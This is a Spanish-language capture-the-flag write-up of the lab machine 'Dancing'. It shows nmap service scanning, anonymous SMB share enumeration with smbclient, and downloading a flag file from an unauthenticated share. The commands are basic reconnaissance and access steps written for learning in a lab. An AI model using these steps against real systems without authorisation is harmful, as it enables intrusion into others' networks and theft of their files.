
## Escaneo de Puertos:

Comenzamos usando "**nmap**" para escanear los puertos abiertos a ver que nos encontramos.
```bash
[16:55:46] bapee@BlumeSec ~/Escritorio/dancing ❯ nmap -sV 10.129.10.196

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Vemos que hay varios puertos abiertos, nosotros vamos a fijarnos en el mas interesante que es el **"445/SMB (Server Message Block)"**.

Ahora nos vamos a intentar conectar al servicio **SMB** mas conocido como **samba**.

## Conexión a SMB:

Para listar los recursos compartidos por SMB utilizaremos el comando **"smbclient -L (IP) -N"**.
```bash
smbclient -L 10.129.10.196 -N
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk
```

Una vez visto eso vamos a descartar los 3 primeros recursos porque:
ADMIN$ y C$ --> Acceso denegado
IPC$ **(Inter-Process Communication)** --> No almacena archivos

Por lo que vamos a fijar **WorkShares** como nuestro objetivo, porque es un recurso compartido al que podemos acceder sin autenticarnos y indagar en busca de informacion.

Ahora accedamos a **WorkShares** a ver que encontramos.
```bash
smbclient //10.129.10.196/WorkShares -N
smb: \> dir
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021
```

Vemos que hay 2 directorios, por lo que vamos a entrar en cada uno a ver que encontramos.
```bash
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 11:08:24 2021
  ..                                  D        0  Mon Mar 29 11:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021
  
smb: \Amy.J\> cd ../James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021
```

Encontramos algo interesante, flag.txt en el directorio de James.P, vamos a transferirla a nuestro directorio con **"get"**.
```bash
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt
```

Una vez descargada, la leemos para ver que sea correcta:
```bash
[17:21:58] bapee@BlumeSec ~/Escritorio/dancing ❯ sudo cat flag.txt 
5f61c10d------------a22f1664                                                
```

Y una vez analizada, vemos que la maquina "**Dancing**" a sido vulnerada con éxito.

## Resumen del Ataque

1. Se realiza un escaneo con **Nmap** y se identifican varios servicios abiertos, destacando el puerto **445/SMB** accesible desde la red.
2. Se enumeran los recursos compartidos mediante `smbclient` y se descubre el recurso **WorkShares**, accesible sin autenticación.
3. Dentro del recurso compartido se localiza el archivo `flag.txt` en el directorio `James.P`, el cual es descargado y leído desde el sistema atacante.